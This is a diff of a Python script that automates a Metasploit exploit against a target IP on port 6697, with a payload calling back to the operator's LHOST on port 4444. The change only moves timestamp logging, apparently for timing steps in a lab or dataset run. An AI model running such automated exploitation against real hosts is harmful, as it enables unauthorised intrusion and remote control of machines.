@@ -9,7 +9,6 @@ def record_timestamp(folder, output_time_file):
     with open(output_time_file, "w+") as fw:
         fw.write('%f' % time.time())
 
-
 def main(argv):
     if len(argv) != 4:
         print("Usage: {} Folder local_ip target_ip".format(argv[0]))
@@ -17,6 +16,11 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
+    
+    # start step 3
+    output_time_file = 'time_step_3_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     client = MsfRpcClient('kali')
 
@@ -26,10 +30,6 @@ def main(argv):
     exploit['RPORT'] = 6697
     payload['LHOST'] = my_ip
     payload['LPORT'] = 4444
-
-    output_time_file = 'time_stage_3_start.txt'
-    record_timestamp(folder, output_time_file)
-    time.sleep(2)
 
     exploit.execute(payload=payload)
 
